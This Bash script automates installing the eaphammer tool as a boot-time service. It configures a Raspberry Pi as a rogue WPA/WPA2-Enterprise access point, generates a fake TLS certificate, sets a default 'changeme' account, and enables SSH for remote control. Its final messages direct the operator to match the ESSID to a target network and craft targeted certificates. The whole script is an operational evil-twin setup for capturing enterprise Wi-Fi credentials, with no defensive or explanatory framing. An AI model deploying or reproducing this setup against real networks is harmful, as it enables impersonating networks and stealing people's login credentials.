#!/usr/bin/env bash

# permissions check
if [ "${USER}" != 'root' ]
then
	echo 'ERROR - root identity needed in order to deal with services'
	exit 1
else
	echo 'INFO - root identity confirmed, proceeding'
fi

# internet access check
ping -c '1' 'github.com' &> '/dev/null'
if [ "${?}" != '0' ]
then
	echo 'ERROR - internet access needed in order to clone eaphammer'
	exit 1
else
	echo 'INFO - internet access confirmed, proceeding'
fi

# eaphammer git clone
echo 'INFO - cloning eaphammer to "/opt/eaphammer/"'
cp 'eaphammer.sh' 'eaphammer.service' '/opt/'
cd '/opt/'
git clone 'https://github.com/s0lst1c3/eaphammer.git' &> '/dev/null'
mv '/opt/eaphammer.sh' '/opt/eaphammer.service' '/opt/eaphammer/'
cd '/opt/eaphammer/'

# eaphammer installation
echo 'INFO - updating, installing dependencies and generating DH parameters. This is going to take a while, you can check the progress with "tail -f /tmp/EAPgrade.log" if you wish :)'
echo -e 'y\n' | ./kali-setup &> '/tmp/EAPgrade.log'

# eaphammer.service setup
echo 'INFO - disabling wpa_supplicant.service and dnsmasq.service so that they don'"'"'t interfere with eaphammer.service'
systemctl disable 'dnsmasq.service' &> '/dev/null'
systemctl disable 'wpa_supplicant.service' &> '/dev/null'
cp '/etc/dhcpcd.conf' '/etc/dhcpcd.conf.backup'
echo 'nohook wpa_supplicant' >> '/etc/dhcpcd.conf'

echo 'INFO - enabling eaphammer.service and ssh.service to administrate your Raspbian without needing to plug in keyboard and display'
cp '/opt/eaphammer/eaphammer.service' '/lib/systemd/system/eaphammer.service'
systemctl enable 'ssh.service' &> '/dev/null'
systemctl enable 'eaphammer.service' &> '/dev/null'

# eaphammer users configuration
echo 'INFO - setting up user "EAPgrade" to access the fake AP network with password "changeme"'
cp '/opt/eaphammer/db/phase2.accounts' '/opt/eaphammer/db/phase2.accounts.backup'
echo -e '"EAPgrade"\tGTC\t"changeme"\t[2]' > '/opt/eaphammer/db/phase2.accounts'

# eaphammer certs generation
echo 'INFO - generating fake TLS certificate to use with eaphammer'
./eaphammer --bootstrap --cn 'hotspot.eapgrade.org' --country 'ES' --state 'Madrid' --locale 'Madrid' --org 'eapgrade' --org-unit 'IT' --email 'administrator@eapgrade.org' &> '/dev/null'

# final steps
chmod +x '/opt/eaphammer/eaphammer.sh'
echo 'INFO - done! The WPA/WPA2-MGT fake AP attack should launch automatically after booting now, raw logs will be located at "/opt/eaphammer/logs/hostapd-eaphammer.raw". Next steps:'
echo '       Modify user and password to access the fake AP network at "/opt/eaphammer/db/phase2.accounts"'
echo '       Modify the ESSID at "/opt/eaphammer/eaphammer.sh" so that it matches your target network'
echo '       Delete "/opt/eaphammer/certs/server/*", "/opt/eaphammer/certs/ca/*" and "/opt/eaphammer/certs/active/*"; and generate your own targeted certs by "cd /opt/eaphammer/ && ./eaphammer --cert-wizard"'

exit 0